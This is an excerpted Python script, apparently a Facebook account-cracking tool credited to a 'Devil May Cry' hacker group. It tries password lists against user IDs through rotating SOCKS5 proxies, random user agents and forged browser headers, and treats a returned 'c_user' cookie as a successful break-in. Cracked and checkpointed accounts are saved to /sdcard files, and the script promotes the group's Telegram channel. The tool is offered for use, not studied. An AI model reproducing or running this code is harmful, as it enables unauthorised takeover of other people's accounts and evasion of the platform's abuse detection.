#created by DMC-HACKER ==DEVIL MAY CRY 
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
\033[1;32m               \033[1;35mCREATED BY\33[0;m   :  \033[1;31mDEVIL MAY CRY \33[0;m\033[1;39m Pro \033[1;35mTeam\33[0;m
\033[1;32m               \033[1;32mAUTHOR       :  \033[1;32mDMC-HACKEE
\033[1;32m               \033[1;36mGITHUB       :  \033[1;33mDEVIL-MAY-CRY-404
\033[1;32m               \033[1;32mSTATUS       :  \033[1;32mRAMADAN GIFT FROM DEVIL-MAY-CRY
...
clear()
os.system("xdg-open https://www.facebook.com/xxxxxx404xxxxx")
xxxx = str(len(ugen))
...
def main():
    ...
    print(f"\033[1;97m[03] \033[1;92mJOIN TO DMC PROGRAMING TELEGRAM")
    ...
    if mirwais in ["1","01"]:
        ...
        os.system("xdg-open https://t.me/@Devilmaycry404Hacker")
        main()
...
def DMC2():
    ...
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/DMC.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/DMCCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            DMCl1 = ['fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.8']
            DMCt2 = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
            DMCc3 = ['"Android"', '"Windows"', '"Linux"']
            DMCm4 = ['POST', 'GET', 'path']
            DMCfetch2 = ['cros', 'navigate']
            DMCdest2 = ['empty', 'document']
            DMCr5 = ['https://t.facebook.com/', 'https://m.facebook.com/', 'https://p.facebook.com/', 'https://x.facebook.com/', 'https://d.facebook.com/']
            DMCs6 = ['"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"', '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"', '"Google Chrome";v="108", "Not)A;Brand";v="8", "Chromium";v="108"']
            DMCco7 = ['"dark"', '"light"']           
            DMCram9 = ['2', '3', '4', '6', '8', '10', '12']
            DMCau2 = ['m.facebook.com', 'mbasic.facebook.com', 'p.facebook.com', 'free.facebook.com']
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            pro = random.choice(ugen)   
            DMCl = random.choice(DMCl1)
            DMCt = random.choice(DMCt2)
            DMCc = random.choice(DMCc3)
            DMCm = random.choice(DMCm4)
            DMCr = random.choice(DMCr5)
            DMCs = random.choice(DMCs6)
            DMCco = random.choice(DMCco7)
            DMCfetch = random.choice(DMCfetch2)            
            DMCau = random.choice(DMCau2)
            DMCram = random.choice(DMCram9)
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[DMC+B-T] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
